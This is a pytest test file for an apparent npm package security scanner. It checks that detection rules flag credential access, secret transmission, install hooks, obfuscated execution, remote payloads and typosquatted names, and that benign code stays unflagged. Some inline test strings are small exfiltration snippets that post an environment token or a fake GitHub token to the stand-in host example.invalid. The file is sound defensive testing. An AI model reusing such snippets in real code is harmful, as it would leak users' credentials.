import json
from pathlib import Path
import pytest
from backend.guardian.engine import analyze, assess, typo
from backend.guardian.explanations import EvidenceExplainer
ROOT = Path(__file__).resolve().parents[2]
def fixture(name):
    return {p.name:p.read_text() for p in (ROOT/'fixtures'/name).iterdir() if p.is_file()}
def rules(files):
    return {f.rule:f for f in analyze(files)[2]}

@pytest.mark.parametrize('name',['benign','benign-install'])
def test_benign_not_elevated(name):
    findings = analyze(fixture(name))[2]
    assert all(f.severity == 'info' for f in findings)
    assert assess(findings)[0] == 'No elevated signals'

def test_env_and_http_are_not_automatically_malicious():
    found = rules(fixture('benign'))
    assert {'CREDENTIAL_ACCESS','NETWORK'} <= found.keys()
    assert 'SENSITIVE_TRANSMISSION' not in found

def test_dataflow_correlation():
    found = rules(fixture('exfiltration'))
    assert found['SENSITIVE_TRANSMISSION'].severity == 'high'
    assert found['SENSITIVE_TRANSMISSION'].confidence == 'medium'
    assert found['SENSITIVE_TRANSMISSION'].evidence[0].line == 4

@pytest.mark.parametrize('name,rule,severity',[('postinstall','INSTALL_REMOTE','high'),('obfuscated','OBFUSCATED_EXECUTION','medium'),('remote','REMOTE_PAYLOAD','medium'),('typosquat','TYPO','medium')])
def test_synthetic_patterns(name,rule,severity):
    assert rules(fixture(name))[rule].severity == severity

def test_correlated_has_multiple_distinct_evidence_types():
    found=rules(fixture('correlated'))
    assert {'SENSITIVE_TRANSMISSION','INSTALL_SCRIPT','OBFUSCATED_EXECUTION','PROCESS_EXECUTION','REMOTE_PAYLOAD'} <= found.keys()
    assert assess(list(found.values()))[0] == 'High concern'

def test_comments_and_strings_are_not_calls():
    assert not rules({'index.js':'// eval(process.env.TOKEN)\nconst s = "fetch(process.env.SECRET)";'})

def test_import_alias_and_computed_environment():
    found=rules({'index.ts':'import send from "axios"; const key: string = process["env"]["TOKEN"]; send.post("https://example.invalid", key);'})
    assert 'SENSITIVE_TRANSMISSION' in found

def test_parse_failure_visible():
    result=analyze({'broken.js':'const = ???'})
    assert result[5] == 0
    assert any('Could not parse' in x for x in result[4])

def test_manifest_only_is_explicit():
    result=analyze({'package.json':'{"name":"test","dependencies":{"react":"^19.0.0"}}'})
    assert result[3][0].version == '^19.0.0'
    assert any('Manifest-only' in x for x in result[4])

def test_lockfile_versions_and_scopes():
    result=analyze({'package-lock.json':json.dumps({'name':'test','lockfileVersion':3,'packages':{'':{'dependencies':{'@scope/pkg':'^1.0.0'}},'node_modules/@scope/pkg':{'version':'1.2.3'},'node_modules/a/node_modules/debug':{'version':'4.0.0'}}})})
    assert [(d.name,d.version,d.direct) for d in result[3]] == [('@scope/pkg','1.2.3',True),('debug','4.0.0',False)]

def test_typos_not_popular_or_scoped():
    assert typo('lodash') is None
    assert typo('@company/lodasb') is None
    assert typo('l0dash') == 'lodash'

def test_malformed_manifest_is_rejected():
    with pytest.raises(ValueError):
        analyze({'package.json':'{"scripts": []}'})

def test_axios_helpers_are_not_network_requests():
    assert 'NETWORK' not in rules({'index.js':'import axios from "axios"; axios.isAxiosError(error);'})

def test_inline_require_and_fake_credential_shape():
    source='const key = "npm_" + "placeholder"; require("https").get("https://example.invalid");'
    assert 'NETWORK' in rules({'index.js':source})
    fake='ghp_'+'X'*36
    found=rules({'index.js':'const fake = "'+fake+'"; fetch("https://example.invalid", {body:fake});'})
    assert 'CREDENTIAL_ACCESS' in found
    assert 'SENSITIVE_TRANSMISSION' in found

def test_assess_source_coverage_independent_of_other_domains():
    # 1. Clean scan with complete source coverage
    risk, rationale = assess([], source_coverage_incomplete=False)
    assert risk == 'No elevated signals'
    assert 'does not establish that the package is safe' in rationale
    assert 'incomplete' not in rationale

    # 2. Clean scan with incomplete source coverage
    risk_inc, rationale_inc = assess([], source_coverage_incomplete=True)
    assert risk_inc == 'No elevated signals'
    assert 'source inspection was incomplete' in rationale_inc

    # 3. Elevated finding with complete source coverage
    from backend.guardian.models import Finding
    f = Finding(id='1', rule='SENSITIVE_TRANSMISSION', title='Data exfiltration', category='Data', severity='high', confidence='high', observed='x', explanation='x', implication='x', recommendation='x', evidence=[])
    risk_elev, rationale_elev = assess([f], source_coverage_incomplete=False)
    assert risk_elev == 'High concern'
    assert 'incomplete' not in rationale_elev

    # 4. Elevated finding with incomplete source coverage
    risk_elev_inc, rationale_elev_inc = assess([f], source_coverage_incomplete=True)
    assert risk_elev_inc == 'High concern'
    assert 'source inspection was incomplete' in rationale_elev_inc
